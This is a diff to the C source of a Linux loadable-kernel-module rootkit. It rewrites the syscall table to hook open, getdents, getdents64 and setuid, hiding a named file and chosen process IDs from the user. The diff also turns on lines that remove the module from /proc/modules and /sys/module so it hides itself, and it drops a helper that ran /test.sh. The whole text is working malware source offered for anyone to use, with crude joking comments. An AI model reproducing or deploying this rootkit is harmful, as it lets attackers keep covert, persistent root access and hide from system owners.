@@ -18,16 +18,16 @@ you won't be able to rmmod it. Brick your system and no one will feel bad for yo
 
 /* Modules license "Lots Of Liquor"
 @##################################################################@
-@ Lol people and their licenses. This is more here to make the     @
-# code look prettier and fullfil some goal of seeming professional #
-@ or something. I dont really know. Anyways this is released under @
+@ Lol people and their licenses. DON'T STEAL FROM ME HUR DUR DUR!  @
+# Like that has ever stopped anyone. Plus lawsuits are lame.       #
+@ Anyways this "rootkit" is released for everyone and anyone under @
 @ the Lots of Liquor license, which means to use it you need lots  @
 # of liquor. Other than that I dont care do what you want to do    #
 @ with this shit.                                                  @
 @################################################################# @
 */
 
-MODULE_LICENSE("WTFPL"); // Do What The Fuck You Want Public License
+MODULE_LICENSE("WTFPL"); // Do What The Fuck You Want Public License, cause linux won't let me compile with LOL
 
 /* Define address size depending on if system is 32 or 64 bit */
 
@@ -45,7 +45,7 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 
 psize *system_call_table; // Store syscall table location
 
-char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
+char *hide_file = "p07470p33l3r"; // Name of files/directory to hide from user
 char hidden_PIDs[50][5];
 int PID_index = 0;
 
@@ -100,12 +100,14 @@ asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hac
             kfree(kernel_pathname);
             return -ENOENT; // Say there is no spoo- I mean file
     }
-    for(i = 0; i < PID_index; i++){
-		if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
-			kfree(kernel_pathname);
-            return -ENOENT; // Say there is no spoo- I mean process
-		}
+    if(strstr(kernel_pathname, "/proc") != NULL){
+    	for(i = 0; i < PID_index; i++){
+	    if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
+	        kfree(kernel_pathname);
+                return -ENOENT; // Say there is no spoo- I mean process
+	    }
 	}
+    }
     kfree(kernel_pathname);
     return orig_open(pathname, flags, mode); // Shit good, run origonal syscall
 }
@@ -149,7 +151,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 
 /* Hacked Getdents Syscall */
 
-asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
+asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents syscall
     unsigned int tmp, n;
     int t;
     struct dirent *dirp2, *dirp3;
@@ -198,17 +200,11 @@ asmlinkage int hacked_setuid(uid_t uid){
 /* Module initialization function */
 
 
-static int start_bin_from_userland(char *arg){
-	char *argv[] = { arg, NULL, NULL};
-	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
-}
-
 int rootkit_init(void) { // Start lel rootkit
 	printk("Rootkit Initialized\n");
 
-	//list_del_init(&__this_module.list); // Remove module from /proc/modules
-	//kobject_del(&THIS_MODULE->mkobj.kobj); // Remove module from /sys/module
+	list_del_init(&__this_module.list); // Remove module from /proc/modules
+	kobject_del(&THIS_MODULE->mkobj.kobj); // Remove module from /sys/module
 
 	if(system_call_table = (psize *) find_sys_call_table()){
 		printk("System call table found at: %p\n", system_call_table); // Ayyy we found it
@@ -230,8 +226,6 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
-	start_bin_from_userland("/test.sh");
-
 	return 0;
 }
 
@@ -242,7 +236,7 @@ void rootkit_exit(void) {
 
 	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
 	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
-	xchg(&system_call_table[__NR_getdents],orig_getdents); // Replace hacked getdents64 with original
+	xchg(&system_call_table[__NR_getdents],orig_getdents); // Replace hacked getdents with original
 	#if defined(__NR_setuid32)
 	xchg(&system_call_table[__NR_setuid32],orig_setuid);
 	#else
